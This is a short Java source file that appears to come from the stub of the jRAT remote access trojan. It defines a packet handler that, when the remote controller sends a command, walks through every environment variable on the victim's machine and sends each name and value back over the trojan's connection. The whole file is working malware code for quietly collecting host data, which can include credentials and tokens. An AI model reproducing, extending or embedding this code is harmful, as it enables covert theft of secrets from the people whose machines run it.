package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;

import java.util.Set;


public class Packet96EnvironmentVariables extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Set<String> set = System.getenv().keySet();
		for (String str : set) {
			Connection.writeLine("VARPROP");
			Connection.writeLine(str);
			Connection.writeLine(System.getenv(str));
		}
	}

}
